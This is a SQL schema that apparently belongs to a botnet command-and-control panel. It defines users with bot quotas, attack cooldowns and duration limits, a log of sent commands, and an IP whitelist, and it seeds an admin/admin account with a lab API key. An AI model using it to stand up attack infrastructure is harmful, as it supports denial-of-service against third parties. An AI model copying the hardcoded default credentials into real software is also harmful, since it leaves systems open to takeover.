CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    max_bots INTEGER NOT NULL DEFAULT 1000,
    admin INTEGER NOT NULL DEFAULT 0,
    last_paid INTEGER NOT NULL DEFAULT 0,
    cooldown INTEGER NOT NULL DEFAULT 0,
    duration_limit INTEGER NOT NULL DEFAULT 0,
    wrc INTEGER NOT NULL DEFAULT 0,
    intvl INTEGER NOT NULL DEFAULT 30,
    api_key TEXT NOT NULL DEFAULT ''
);

CREATE TABLE IF NOT EXISTS history (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    time_sent INTEGER NOT NULL,
    duration INTEGER NOT NULL,
    command TEXT NOT NULL,
    max_bots INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS whitelist (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    prefix TEXT NOT NULL,
    netmask INTEGER NOT NULL
);

INSERT OR IGNORE INTO users (username, password, max_bots, admin, api_key)
VALUES ('admin', 'admin', 9999, 1, 'ixf-lab-api-key');
